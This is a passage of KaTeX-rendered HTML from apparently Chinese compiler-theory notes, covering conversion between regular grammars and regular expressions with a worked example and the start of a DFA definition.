encoding=\"application/x-tex\">\\left(A^{*}\\right)^{*}=A^{*}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.078596em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.688696em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.828596em;\"><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.688696em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">A</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.688696em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span></span></span></li>\n</ol>\n<h4 id=\"正规文法与正规式的相互转换\"><a class=\"markdownIt-Anchor\" href=\"#正规文法与正规式的相互转换\"></a> 正规文法与正规式的相互转换</h4>\n<h5 id=\"正规文法转正规式\"><a class=\"markdownIt-Anchor\" href=\"#正规文法转正规式\"></a> 正规文法转正规式</h5>\n<ol>\n<li>将正规文法中的每个nonterminal表示成关于它的正规式方程，获得一个<strong>联立方程组</strong>。</li>\n<li>终结规则：</li>\n</ol>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>i</mi><mi>f</mi><mtext>  </mtext><mi>x</mi><mo>=</mo><mi>α</mi><mi>x</mi><mi mathvariant=\"normal\">∣</mi><mi>β</mi><mo separator=\"true\">,</mo><mtext> </mtext><mi>x</mi><mo>=</mo><msup><mi>α</mi><mo>∗</mo></msup><mi>β</mi><mspace linebreak=\"newline\"></mspace><mi>i</mi><mi>f</mi><mtext>  </mtext><mi>x</mi><mo>=</mo><mi>x</mi><mi>α</mi><mi mathvariant=\"normal\">∣</mi><mi>β</mi><mo separator=\"true\">,</mo><mtext> </mtext><mi>x</mi><mo>=</mo><mi>β</mi><msup><mi>α</mi><mo>∗</mo></msup></mrow><annotation encoding=\"application/x-tex\">if\\ \\  x=\\alpha x|\\beta,\\ x=\\alpha^{*}\\beta \\\\\nif\\ \\  x=x\\alpha|\\beta,\\ x=\\beta\\alpha^{*}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\" style=\"margin-right:0.10764em;\">f</span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mord mathdefault\">x</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\">x</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mspace\"> </span><span class=\"mord mathdefault\">x</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.933136em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.738696em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8888799999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\" style=\"margin-right:0.10764em;\">f</span><span class=\"mspace\"> </span><span class=\"mspace\"> </span><span class=\"mord mathdefault\">x</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">x</span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mspace\"> </span><span class=\"mord mathdefault\">x</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.933136em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05278em;\">β</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.738696em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span></span></span></span></p>\n<ol start=\"3\">\n<li>用终结规则、分配律、交换律和结合律求解即可。</li>\n</ol>\n<p>一个（不太）简单的例子</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">正</mi><mi mathvariant=\"normal\">规</mi><mi mathvariant=\"normal\">文</mi><mi mathvariant=\"normal\">法</mi><mtext> </mtext><mi>G</mi><mi mathvariant=\"normal\">：</mi><mspace linebreak=\"newline\"></mspace><mi>Z</mi><mo>→</mo><mn>0</mn><mi>A</mi><mspace linebreak=\"newline\"></mspace><mi>A</mi><mo>→</mo><mn>0</mn><mi>A</mi><mi mathvariant=\"normal\">∣</mi><mn>0</mn><mi>B</mi><mspace linebreak=\"newline\"></mspace><mi>B</mi><mo>→</mo><mn>1</mn><mi>A</mi><mi mathvariant=\"normal\">∣</mi><mi>ϵ</mi></mrow><annotation encoding=\"application/x-tex\">正规文法\\ G：\\\\\nZ\\rightarrow 0A\\\\\nA\\rightarrow 0A|0B \\\\\nB\\rightarrow 1A|\\epsilon\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord cjk_fallback\">正</span><span class=\"mord cjk_fallback\">规</span><span class=\"mord cjk_fallback\">文</span><span class=\"mord cjk_fallback\">法</span><span class=\"mspace\"> </span><span class=\"mord mathdefault\">G</span><span class=\"mord cjk_fallback\">：</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">Z</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">0</span><span class=\"mord mathdefault\">A</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">0</span><span class=\"mord mathdefault\">A</span><span class=\"mord\">∣</span><span class=\"mord\">0</span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">1</span><span class=\"mord mathdefault\">A</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\">ϵ</span></span></span></span></span></p>\n<p>由第三式和第二式，有</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>=</mo><mn>0</mn><mi>A</mi><mi mathvariant=\"normal\">∣</mi><mn>01</mn><mi>A</mi><mi mathvariant=\"normal\">∣</mi><mn>0</mn><mspace linebreak=\"newline\"></mspace><mi>A</mi><mo>=</mo><mo stretchy=\"false\">(</mo><mn>0</mn><mi mathvariant=\"normal\">∣</mi><mn>01</mn><mo stretchy=\"false\">)</mo><mi>A</mi><mi mathvariant=\"normal\">∣</mi><mn>0</mn></mrow><annotation encoding=\"application/x-tex\">A=0A|01A|0 \\\\\nA=(0|01)A|0\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">0</span><span class=\"mord mathdefault\">A</span><span class=\"mord\">∣</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mord mathdefault\">A</span><span class=\"mord\">∣</span><span class=\"mord\">0</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord\">0</span><span class=\"mord\">∣</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mclose\">)</span><span class=\"mord mathdefault\">A</span><span class=\"mord\">∣</span><span class=\"mord\">0</span></span></span></span></span></p>\n<p>所以</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>=</mo><mo stretchy=\"false\">(</mo><mn>0</mn><mi mathvariant=\"normal\">∣</mi><mn>01</mn><msup><mo stretchy=\"false\">)</mo><mo>∗</mo></msup><mn>0</mn><mspace linebreak=\"newline\"></mspace><mi>Z</mi><mo>=</mo><mn>0</mn><mo stretchy=\"false\">(</mo><mn>0</mn><mi mathvariant=\"normal\">∣</mi><mn>01</mn><msup><mo stretchy=\"false\">)</mo><mo>∗</mo></msup><mn>0</mn></mrow><annotation encoding=\"application/x-tex\">A=(0|01)^{*}0 \\\\\nZ=0(0|01)^{*}0\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord\">0</span><span class=\"mord\">∣</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.738696em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mord\">0</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">Z</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">0</span><span class=\"mopen\">(</span><span class=\"mord\">0</span><span class=\"mord\">∣</span><span class=\"mord\">0</span><span class=\"mord\">1</span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.738696em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mord\">0</span></span></span></span></span></p>\n<h5 id=\"正规式转换正规文法\"><a class=\"markdownIt-Anchor\" href=\"#正规式转换正规文法\"></a> 正规式转换正规文法</h5>\n<p>假设存在字母表<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">Σ</mi></mrow><annotation encoding=\"application/x-tex\">\\Sigma</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">Σ</span></span></span></span>和正规式，需要转换为正规文法<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi><mo>=</mo><mrow><mo fence=\"true\">(</mo><msub><mi>V</mi><mi>N</mi></msub><mo separator=\"true\">,</mo><msub><mi>V</mi><mi>T</mi></msub><mo separator=\"true\">,</mo><mi>P</mi><mo separator=\"true\">,</mo><mi>S</mi><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">G=\\left(V_{N},V_{T},P,S\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">G</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.13889em;\">P</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span>。</p>\n<ol>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>V</mi><mi>T</mi></msub><mo>=</mo><mi mathvariant=\"normal\">Σ</mi></mrow><annotation encoding=\"application/x-tex\">V_{T}=\\Sigma</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">Σ</span></span></span></span>。</li>\n<li>对原始正规式<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>R</mi></mrow><annotation encoding=\"application/x-tex\">R</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.00773em;\">R</span></span></span></span>选择一个nonterminal <span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>Z</mi></mrow><annotation encoding=\"application/x-tex\">Z</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">Z</span></span></span></span>，生成规则<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>Z</mi><mo>→</mo><mi>R</mi></mrow><annotation encoding=\"application/x-tex\">Z\\rightarrow R</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">Z</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.00773em;\">R</span></span></span></span>，令<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi><mo>=</mo><mi>Z</mi></mrow><annotation encoding=\"application/x-tex\">S=Z</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">Z</span></span></span></span>。</li>\n<li>若存在形如<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>a</mi><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">A\\rightarrow ab</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">b</span></span></span></span>的规则，转换为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>α</mi><mi>B</mi></mrow><annotation encoding=\"application/x-tex\">A\\rightarrow \\alpha B</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span></span></span></span>和<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>B</mi><mo>→</mo><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">B\\rightarrow b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05017em;\">B</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">b</span></span></span></span>。</li>\n<li>若存在形如<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><msup><mi>a</mi><mo>∗</mo></msup><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">A\\rightarrow a^{*}b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">a</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.688696em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mord mathdefault\">b</span></span></span></span>的规则，转换为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>A</mi><mo>→</mo><mi>a</mi><mi>A</mi><mi mathvariant=\"normal\">∣</mi><mi>b</mi></mrow><annotation encoding=\"application/x-tex\">A \\rightarrow aA|b</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">A</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">→</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">A</span><span class=\"mord\">∣</span><span class=\"mord mathdefault\">b</span></span></span></span>。</li>\n<li>重复3和4，直到没得转换。</li>\n</ol>\n<h3 id=\"有穷自动机\"><a class=\"markdownIt-Anchor\" href=\"#有穷自动机\"></a> 有穷自动机</h3>\n<p>有穷自动机是具有<strong>离散输入</strong>和<strong>输出系统</strong>的一种抽象数学模型，分为确定有穷自动机和非确定有穷自动机，两者都能准确识别正规集。</p>\n<h4 id=\"确定有穷自动机-dfa\"><a class=\"markdownIt-Anchor\" href=\"#确定有穷自动机-dfa\"></a> 确定有穷自动机 DFA</h4>\n<p>一个DFA是一个五元组<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>M</mi><mo>=</mo><mrow><mo fence=\"true\">(</mo><mi>Q</mi><mo separator=\"true\">,</mo><mi mathvariant=\"normal\">Σ</mi><mo separator=\"true\">,</mo><mi>f</mi><mo separator=\"true\">,</mo><mi>S</mi><mo separator=\"true\">,</mo><mi>Z</mi><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">M=\\left(Q,\\Sigma,f,S,Z\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.10903em;\">M</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\">Q</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\">Σ</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.10764em;\">f</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.07153em;\">Z</span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span>，其中</p>\n<ol>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>Q</mi></mrow><annotation encoding=\"application/x-tex\">Q</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">Q</span></span></span></span>是一个有穷状态集合，集合中每一个元素是一个<strong>状态</strong>；</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi mathvariant=\"normal\">Σ</mi></mrow><annotation encoding=\"application/x-tex\">\\Sigma</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord\">Σ</span></span></span></span>是一个有穷输入字母表，表中每个元素称为一个<strong>输入字符</strong>；</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>f</mi></mrow><annotation 